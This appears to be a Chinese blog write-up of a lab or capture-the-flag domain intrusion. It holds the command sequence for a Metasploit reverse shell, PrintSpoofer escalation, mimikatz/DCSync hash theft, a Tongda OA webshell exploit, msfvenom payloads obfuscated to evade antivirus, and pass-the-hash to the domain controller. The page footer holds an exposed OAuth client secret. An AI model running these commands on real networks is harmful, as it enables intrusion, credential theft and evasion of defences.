+<h4 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler #监听模块</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.0.122</span><br><span class="line">set lport 2333</span><br><span class="line">show options</span><br><span class="line">exploit -j</span><br></pre></td></tr></table></figure>
+
+<p>利用过狗工具嘞，上传p1.exe，且在虚拟终端上用printSpoofer工具运行该软件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printspoofer1.exe -i -c &quot;p1.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<p>kali会生成会话，进入控制端</p>
+<p>sysinfo 得到系统信息</p>
+<h3 id="hashcat破解web服务器的hash"><a href="#hashcat破解web服务器的hash" class="headerlink" title="hashcat破解web服务器的hash"></a>hashcat破解web服务器的hash</h3><p>kali里在监听处，输入<code>ps</code>查看进程</p>
+<p>找一个x64的administrator进程，进行迁移</p>
+<h4 id="注入系统进程"><a href="#注入系统进程" class="headerlink" title="注入系统进程"></a>注入系统进程</h4><p><code>migrate 2292</code></p>
+<h4 id="获取哈希"><a href="#获取哈希" class="headerlink" title="获取哈希"></a>获取哈希</h4><p><code>hashdump</code>(需要system权限)</p>
+<blockquote>
+<p>显示的为 服务器hash信息内容</p>
+</blockquote>
+<p>也可以用：</p>
+<p><code>load mimikatz</code></p>
+<blockquote>
+<p>help</p>
+<p>kerberos</p>
+<p>wdigest</p>
+</blockquote>
+<p>netstat一下，看看端口</p>
+<p>发现3389端口是开着的</p>
+<p><a target="_blank" rel="noopener" href="http://www.cmd5.com是可以破解哈希的/">www.cmd5.com是可以破解哈希的</a></p>
+<p>也可以用hashcat</p>
+<p>将获取的某一条hash值存进hash.txt，得到的字典为rockyou.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 0 -m 1000 hash.txt rockyou.txt --force</span><br></pre></td></tr></table></figure>
+
+<p>-a 0是字典模式</p>
+<p>-m 是类型</p>
+<p>hash.txt是ntml</p>
+<h2 id="内网篇"><a href="#内网篇" class="headerlink" title="内网篇"></a>内网篇</h2><h3 id="登录远程桌面"><a href="#登录远程桌面" class="headerlink" title="登录远程桌面"></a>登录远程桌面</h3><p>其实可以远程连接哈，已经破解了web服务器的Administrator的hash密码了</p>
+<p>在主机进行连接即可，输入目标ip，用户名，还有密码</p>
+<p><strong>连接后，进行清除痕迹、关闭安全狗</strong></p>
+<h3 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h3><p>kali在监听的模块里，</p>
+<p>可以<code>ifconfig</code>，查看web服务器是否在域内，有10.10.1.131</p>
+<p><code>netstat</code>查看是否有连接内网的</p>
+<h4 id="跨网段横向渗透"><a href="#跨网段横向渗透" class="headerlink" title="跨网段横向渗透"></a>跨网段横向渗透</h4><h5 id="内网ping协议发现主机"><a href="#内网ping协议发现主机" class="headerlink" title="内网ping协议发现主机"></a>内网ping协议发现主机</h5><p>对10.10.1.0&#x2F;24 进行横向渗透 首先获取这个段下的pc</p>
+<p>在meterpreter &gt; 输入shell</p>
+<p>运行以下语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /l %i in (1,1,255) do @ ping 10.10.1.%i -w l -n l|find /i &quot;ttl=&quot;</span><br></pre></td></tr></table></figure>
+
+<p>或者不进入shell</p>
+<p>使用扫描模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run arp_scanner -r 10.10.1.0/24</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>扫描到 10.10.1.130 与本机的131</p>
+</blockquote>
+<h5 id="设置代理nmap对跨网段主机端口"><a href="#设置代理nmap对跨网段主机端口" class="headerlink" title="设置代理nmap对跨网段主机端口"></a>设置代理nmap对跨网段主机端口</h5><p>kali想要对10.10.1.130操作，需要在web服务器上做代理</p>
+<p>kali重新利用模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks4a</span><br><span class="line">show options //显示了端口为1080</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>另开一个终端端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/proxychains.conf</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>更改内容：</p>
+<p>socks4 192.168.0.122 1080</p>
+</blockquote>
+<p>在上述socks4a模块exploit后，输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions 3</span><br></pre></td></tr></table></figure>
+
+<p>msf添加路由</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 10.10.1.0/24</span><br><span class="line">run autoroute -p</span><br><span class="line">use auxiliary/server/socks4a</span><br></pre></td></tr></table></figure>
+
+<p>在kali新终端调用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains3 nmap -sT -Pn 10.10.1.130 -p 80</span><br></pre></td></tr></table></figure>
+
+<p>如果信息里有个”<strong>OK</strong>“，表示可以用kali对10.10.1.130操作了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains3 firefox http://10.10.1.130</span><br></pre></td></tr></table></figure>
+
+<p>显示了一个通达OA网络智能办公室系统登录界面</p>
+<p><strong>端口查询</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains3 nmap -sT -Pn 10.10.1.130 -p80,89,8000,9090,1433,1521,3306,5432,445,135,443,873,5984,6379,7001,7002,9200,9300,11121,27017,27018,50000,50070,50030,21,22,23,2601,3389 --open</span><br></pre></td></tr></table></figure>
+
+<p>只开放了80端口，考虑做了端口访问控制</p>
+<h4 id="配置蚁剑代理并连接小马"><a href="#配置蚁剑代理并连接小马" class="headerlink" title="配置蚁剑代理并连接小马"></a>配置蚁剑代理并连接小马</h4><p>去github找通达的exp&#x2F;poc，clone下来，找到exp.py文件</p>
+<p>用蚁剑生成shell</p>
+<p>通过kali进行编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;shell内容&quot; | base64</span><br></pre></td></tr></table></figure>
+
+<p>将编码的内容替换掉exp.py中的编码内容即可</p>
+<p>代理运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python exp.py -H http://10.10.1.130 -file-shell</span><br></pre></td></tr></table></figure>
+
+<p>给了个最终路径结果</p>
+<blockquote>
+<p>http :&#x2F;&#x2F;10.10.1.130&#x2F;ispirit&#x2F;interface&#x2F;xiaoma.php</p>
+</blockquote>
+<p>去访问这个路径</p>
+<p>然后蚁剑配置下代理</p>
+<blockquote>
+<p>socks4协议，代理服务器为192.168.0.122，端口1080</p>
+</blockquote>
+<p>蚁剑去连接就可以了</p>
+<h4 id="对通达OA服务器信息收集"><a href="#对通达OA服务器信息收集" class="headerlink" title="对通达OA服务器信息收集"></a>对通达OA服务器信息收集</h4><p>在蚁剑的虚拟终端中，输入如下信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all &gt; cmd.txt</span><br><span class="line">net start &gt; cmd.txt</span><br><span class="line">tasklist &gt; cmd.txt</span><br><span class="line">netstat -ano &gt;&gt; cmd.txt</span><br><span class="line">systeminfo &gt;&gt; cmd.txt</span><br><span class="line">net user &gt;&gt; cmd.txt</span><br></pre></td></tr></table></figure>
+
+<p>在蚁剑中找到该txt，进行查看</p>
+<h4 id="命令行关闭OA系统防火墙"><a href="#命令行关闭OA系统防火墙" class="headerlink" title="命令行关闭OA系统防火墙"></a>命令行关闭OA系统防火墙</h4><p>在蚁剑的虚拟终端中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set allprofiles //查看防火墙状态</span><br><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>
+
+<p>这样kali就可以访问除80以外的端口，可以正向连接OA服务器</p>
+<p>然后去kali，执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains3 nmap -sT -Pn 10.10.1.130 -p 445</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="msf正向木马免杀过360全家桶"><a href="#msf正向木马免杀过360全家桶" class="headerlink" title="msf正向木马免杀过360全家桶"></a>msf正向木马免杀过360全家桶</h4><p>生成攻击载荷：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp lport=6666 -e x86/shikata_ga_nai -i 15 -f csharp -o payload_bind.txt </span><br></pre></td></tr></table></figure>
+
+<p>将txt的内容复制，用掩日免杀生成bind.exe</p>
+<p>将这个弄到一个有360的虚拟机中，发现是被查杀了的</p>
+<p>改为<code>-i 12</code>重复一遍，b.exe也查杀了</p>
+<p>kali进入msf</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">exploit multi/handler </span><br><span class="line">set lport 6666</span><br><span class="line">set rhost 10.10.1.130</span><br><span class="line"></span><br><span class="line">show options</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>将b.exe拖进蚁剑里，蚁剑的终端运行一下该软件，没有查杀</p>
+<p>此时kali</p>
+<blockquote>
+<p>进入了meterpreter &gt; </p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig</span><br></pre></td></tr></table></figure>
+
+<p>发现了ip 130 还有166</p>
+<p>说明已经拿到OA主机的权限了</p>
+<p>回到蚁剑的终端，看OA服务器是否通网</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://www.baidu.com &gt; cmd.txt</span><br></pre></td></tr></table></figure>
+
+<p>没结果，不通网，那360只能查杀一些已有的</p>
+<h2 id="收集整理分析内网域的信息"><a href="#收集整理分析内网域的信息" class="headerlink" title="收集整理分析内网域的信息"></a>收集整理分析内网域的信息</h2><blockquote>
+<p>还在meterpreter &gt; </p>
+</blockquote>
+<p>hashdump</p>
+<p>失败了</p>
+<p>ps，找到一个x64位的程序，如1048</p>
+<p><code>migrate 1048</code></p>
+<p><code>hashdump</code>，获取到了hash值</p>
+<p><code>load mimikatz</code></p>
+<p><code>msv</code></p>
+<blockquote>
+<p>显示了域名，用户名，密码是看不了的</p>
+</blockquote>
+<p><code>sysinfo</code></p>
+<blockquote>
+<p>操作系统，域名等</p>
+</blockquote>
+<h3 id="定位是否是一个域控环境"><a href="#定位是否是一个域控环境" class="headerlink" title="定位是否是一个域控环境"></a>定位是否是一个域控环境</h3><blockquote>
+<p>还在meterpreter &gt; </p>
+</blockquote>
+<p><code>shell</code></p>
+<p>来到OA的终端</p>
+<p>发现有乱码情况</p>
+<p>输入 <code>chcp 65001</code>，设置编码</p>
+<p>使用 <code>net time</code>，确认域控时间</p>
+<blockquote>
+<p>假如是在域控的主机、就会返回域控的同步时间 </p>
+</blockquote>
+<blockquote>
+<p>Current time at \\dc.attack.local is …</p>
+</blockquote>
+<p>也可以用模块定位域内pc</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post /windows/gather/enum_domain</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>发现了域控的ip。。。165</p>
+</blockquote>
+<p>查看登录过的用户：</p>
+<p>继续在shell情况下：</p>
+<p><code>cd c:\</code></p>
+<p><code>dir</code></p>
+<p><code>dir Users</code></p>
+<p>或者在meterpreter &gt;情况下：</p>
+<p><code>run post/..../enum_logged_on_users</code></p>
+<p>查看组信息：</p>
+<p><code>run post/..../enum_ad_groups</code></p>
+<p>查看域内信息</p>
+<p><code>run post/..../enum_domain_tokens</code></p>
+<p>可以查看到有的进程，是域管理员在线的</p>
+<p>进入shell，查看域基础信息</p>
+<blockquote>
+<p>shell</p>
+<p>chcp 65001</p>
+<p>net user</p>
+<p>net view &#x2F;domain</p>
+<p>nltest &#x2F;domain_trusts</p>
+<p>net config workstation</p>
+<p>net user &#x2F;domain</p>
+<p>net group &#x2F;domain</p>
+<p>net localgroup administrators &#x2F;domain &#x2F;&#x2F;登录该台服务器的域管理员</p>
+<p>net group “domain admins” &#x2F;domain</p>
+<p>net group “domain controllers” &#x2F;domain</p>
+<p>net view &#x2F;domain:attack</p>
+<p>net view &#x2F;domain:attack.local</p>
+</blockquote>
+<p>whoami</p>
+<blockquote>
+<p>显示是系统权限</p>
+</blockquote>
+<p>exit</p>
+<p>ps</p>
+<h3 id="跨网段探测DC端口"><a href="#跨网段探测DC端口" class="headerlink" title="跨网段探测DC端口"></a>跨网段探测DC端口</h3><p>可以看到有的进程是域管理员在线的，选择x64的，比如3196</p>
+<p>窃取它的token</p>
+<p><code>steal_token 3196</code></p>
+<p>getuid</p>
+<p>权限变成了一个域的管理员连接，就可以去访问它的dir，木马写进去执行，得到域控权限</p>
+<p>但是继续shell的话，分配失败，</p>
+<p>whoami</p>
+<p>仍然是system权限</p>
+<p><code>dir \\DC\c$</code> 不允许</p>
+<p>回到 meterpreter&gt;</p>
+<p>先取消刚刚窃取的administrato的shell</p>
+<p><code>rev2self</code>终结权限</p>
+<p>getuid 变回system权限</p>
+<h2 id="访问域控信息"><a href="#访问域控信息" class="headerlink" title="访问域控信息"></a>访问域控信息</h2><p>在10.10.1.130的机器上添加一条10.10.10.0&#x2F;24的静态路由、以便我们访问域控的10.10.10.的机器</p>
+<p><code>run autoroute -s 10.10.10.0/24</code></p>
+<p>新开的kali端口进行nmap扫描，域控一般开放88端口(kerberos的)</p>
+<p>proxychains nmap对域控</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains3 nmap -sT -Pn 10.10.10.165 -p 88</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains3 nmap -sT -Pn 10.10.10.165 -p80,88，89,8000,9090,1433,1521,3306,5432,445,135,443,873,5984,6379,7001,7002,9200,9300,11121,27017,27018,50000,50070,50030,21,22,23,2601,3389 --open</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>开放了88，3389啊，445，135啊端口</p>
+</blockquote>
+<h2 id="利用kiwi-dcsync-ntlm获取"><a href="#利用kiwi-dcsync-ntlm获取" class="headerlink" title="利用kiwi dcsync ntlm获取"></a>利用kiwi dcsync ntlm获取</h2><h3 id="获取域用户的PID-SID的NTML"><a href="#获取域用户的PID-SID的NTML" class="headerlink" title="获取域用户的PID SID的NTML"></a>获取域用户的PID SID的NTML</h3><p>meterpreter&gt; 中</p>
+<p>sysinfo</p>
+<blockquote>
+<p>Meterpreter是x86</p>
+</blockquote>
+<p>ps</p>
+<p>找到x64的进程，迁移一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">migrate xxx</span><br><span class="line"></span><br><span class="line">load mimikatz</span><br><span class="line"></span><br><span class="line">load kiwi</span><br><span class="line"></span><br><span class="line">help</span><br><span class="line"></span><br><span class="line">getuid //现在是system权限</span><br><span class="line"></span><br><span class="line">dcsync_ntlm administrator //该权限不起作用</span><br><span class="line"></span><br><span class="line">ps </span><br><span class="line"></span><br><span class="line">//还是要找一个域管理员权限的x64</span><br><span class="line"></span><br><span class="line">steal_token xxxx</span><br><span class="line"></span><br><span class="line">dcsync_ntlm administrator</span><br><span class="line"></span><br><span class="line">//显示了域管理员的哈希</span><br><span class="line">/*</span><br><span class="line">Account</span><br><span class="line">NTLM Hash</span><br><span class="line">LM Hash</span><br><span class="line">SID</span><br><span class="line">RID</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">dcsync_ntlm  krbtgt</span><br><span class="line"></span><br><span class="line">background</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">以下msf能使用的条件：</span><br><span class="line">①开启445端口SMB服务（默认开启）</span><br><span class="line">②开启admin$共享</span><br><span class="line">*/</span><br><span class="line">search psexec</span><br><span class="line"></span><br><span class="line">use exploit/.../smb/psexec</span><br><span class="line"></span><br><span class="line">show options</span><br><span class="line"></span><br><span class="line">set RHOSTS 10.10.10.165</span><br><span class="line"></span><br><span class="line">set smbpass 为域管理员的NTLM哈希</span><br><span class="line"></span><br><span class="line">set smbuser administrator</span><br><span class="line"></span><br><span class="line">show options</span><br><span class="line"></span><br><span class="line">exploit </span><br><span class="line"></span><br><span class="line">sessions</span><br><span class="line"></span><br><span class="line">//有7,8,9 三个 </span><br><span class="line"></span><br><span class="line">sessions 9</span><br><span class="line"></span><br><span class="line">getuid</span><br><span class="line">//server username: ATTACK\administrator</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="登录域控管理员"><a href="#登录域控管理员" class="headerlink" title="登录域控管理员"></a>登录域控管理员</h2><h2 id="做一个pth登录"><a href="#做一个pth登录" class="headerlink" title="做一个pth登录"></a>做一个pth登录</h2><p><a target="_blank" rel="noopener" href="https://it.cha138.com/mysql/show-4021861.html">内网横向之PTH</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46258964/article/details/124655483">https://blog.csdn.net/qq_46258964/article/details/124655483</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.geekby.site/2019/04/pthpass-the-hash-%E6%94%BB%E5%87%BB/">https://www.geekby.site/2019/04/pthpass-the-hash-%E6%94%BB%E5%87%BB/</a></p>
+<h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><p><a target="_blank" rel="noopener" href="https://github.com/sssssanr/Mimikatz-Csharp">https://github.com/sssssanr/Mimikatz-Csharp</a></p>
+<p>原理是：<strong>反射PE注入将mimikatz加载到内存运行</strong></p>
+<p>dll不会被杀，行为查杀，不会拦截</p>
+<ul>
+<li>打开windows powershell生成key.snk</li>
+<li>将key.snk和下载好的katz.cs复制到Microsoft.NET对应文件夹(C:\Windows\Microsoft.NET\Framework\v4.0.30319 记为path)</li>
+<li>打开cmd后，</li>
+<li>cd path</li>
+<li>csc.exe &#x2F;r:… (复制其CscCsc编译成DLL下的命令)  &#x2F;&#x2F;csc.exe是C#编译器</li>
+</ul>
+<p>生成了一个regsvcs.dll，可以避免被杀</p>
+<blockquote>
+<p>建议是在windows server 2012这样的老机器上运行的一般win10运行会出错 如果运行的时候错误说缺少“System.IO.Compression.dll”文件、我们只需要去下载即可</p>
+</blockquote>
+<ul>
+<li>regsvcs.exe regsvcs.dll</li>
+</ul>
+<p>有一个PtH功能(Pass The Hash) 哈希传递</p>
+<p>将这个dll给kali，</p>
+<p>kali在meterpreter下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload regsvcs.dll c:/windows/temp/</span><br></pre></td></tr></table></figure>
+
+<p>(上传到了10.10.1.130的机器那去了，可以通过蚁剑看到)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line"></span><br><span class="line">chcp 65001</span><br><span class="line"></span><br><span class="line">tasklist //看下进程，有没有cmd.exe</span><br><span class="line"></span><br><span class="line">cd ../temp //切换到有regsvcs.dll的文件夹下</span><br><span class="line">C:/Windows/Microsoft.NET/Fra../v4.0.../RegSvcs.exe regsvcs.dll</span><br><span class="line"></span><br><span class="line">进入到mimikatz #</span><br><span class="line">mimikatz sekurlsa::pth/user:administrator/domain:attack.local/ntlm:c7078b8300f0eacbffe68981cc733ee4 </span><br><span class="line"></span><br><span class="line">//显示的有ERROR 失败了</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="失败了"><a href="#失败了" class="headerlink" title="失败了"></a>失败了</h3><h2 id="破解域控NTML并登录域控"><a href="#破解域控NTML并登录域控" class="headerlink" title="破解域控NTML并登录域控"></a>破解域控NTML并登录域控</h2><p><a target="_blank" rel="noopener" href="http://www.cmd5.com,破解出来了,付费即可/">www.cmd5.com，破解出来了，付费即可</a></p>
+<h3 id="用主机的windows做个代理"><a href="#用主机的windows做个代理" class="headerlink" title="用主机的windows做个代理"></a>用主机的windows做个代理</h3><p>在kali中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains3 rdesktop 10.10.10.165</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>连接失败</p>
+</blockquote>
+<p>必须要windows的终端</p>
+<p>工具名为SocksCap64，启动</p>
+<p>win+r 输入mstsc，拉进上个程序中即可</p>
+<p>代理配置为192.168.0.122 1080 SOCKS4</p>
+<p><strong>在隧道中运行</strong>远程桌面连接</p>
+<p>输入10.10.10.165</p>
+<p>用户名：administrator，输入密码</p>
+<p>进入域控的cmd.exe</p>
+<p>dir</p>
+<p>type flag.txt</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h2 id="正向连接、反向连接、socks代理"><a href="#正向连接、反向连接、socks代理" class="headerlink" title="正向连接、反向连接、socks代理"></a><a target="_blank" rel="noopener" href="http://www.taodudu.cc/news/show-4295856.html?action=onClick">正向连接、反向连接、socks代理</a></h2><p>网络不稳定、操作被拦截，控制的会掉，timed out</p>
+<p>那还是从<strong>反向连接</strong>开始，msf弄好，exploit，然后过狗webshell工具的虚拟终端运行事先上传进去的木马，这边kali就会获取到几个session，且进meterpreter，随便取一个即可，比如 <code>session 8</code>，</p>
+<p>继续添加路由</p>
+<p><code>run autoroute -s 10.10.1.0/24</code></p>
+<p>background</p>
+<p>然后改为<strong>正向连接</strong>…exploit，</p>
+<p>蚁剑控制的虚拟终端中去运行对应的木马</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2023/09/03/%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">内网域渗透</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2023/09/04/%E5%86%85%E5%AD%98%E9%A9%AC/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            内存马
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2023/09/01/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">网络基础</div>
+      </a>
+    
+  </nav>
+
+  
+   
+<div class="gitalk" id="gitalk-container"></div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/gitalk/1.7.2/gitalk.min.css">
+
+
+<script src="https://cdn.staticfile.org/gitalk/1.7.2/gitalk.min.js"></script>
+
+
+<script src="https://cdn.staticfile.org/blueimp-md5/2.19.0/js/md5.min.js"></script>
+
+<script type="text/javascript">
+  var gitalk = new Gitalk({
+    clientID: '93da8388ad1469a8be66',
+    clientSecret: '9dea6314b14ae1877632f2bcbe0a639dd4485bb1',
+    repo: 'blogtalk',
+    owner: 'ak005469075',
+    admin: ['ak005469075'],
+    // id: location.pathname,      // Ensure uniqueness and length less than 50
+    id: md5(location.pathname),
+    distractionFreeMode: false,  // Facebook-like distraction free mode
+    pagerDirection: 'last'
+  })
+
+  gitalk.render('gitalk-container')
+</script>
+
+  
+    
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2023-2024
+        <i class="ri-heart-fill heart_icon"></i> 是羽泪云诶
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
